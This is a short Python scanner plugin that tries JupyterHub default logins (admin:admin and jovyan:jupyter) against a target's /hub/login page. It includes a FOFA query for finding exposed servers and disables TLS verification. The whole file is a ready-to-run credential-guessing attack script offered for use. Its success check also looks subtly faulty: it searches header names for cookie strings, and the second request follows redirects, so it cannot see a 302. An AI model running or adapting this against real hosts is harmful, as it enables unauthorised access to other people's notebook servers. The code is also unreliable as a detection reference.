#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Jupyterhub默认口令',

      'level'     :   'high',

      'FOFA'      :   'title="JupyterHub"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/hub/login?next='
  data1 = 'username=admin&password=admin'
  data2 =  'username=jovyan&password=jupyter'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and 'jupyterhub-session-id=' in res.headers or res.status_code == 302 and 'jupyterhub-hub-login=' in res.headers:
      ret['huixian'] = 'admin:admin'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data2,timeout=5,verify=False)
    if res.status_code == 302 and 'jupyterhub-session-id=' in res.headers or res.status_code == 302 and 'jupyterhub-hub-login=' in res.headers:
      ret['huixian'] = 'jovyan:jupyter'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret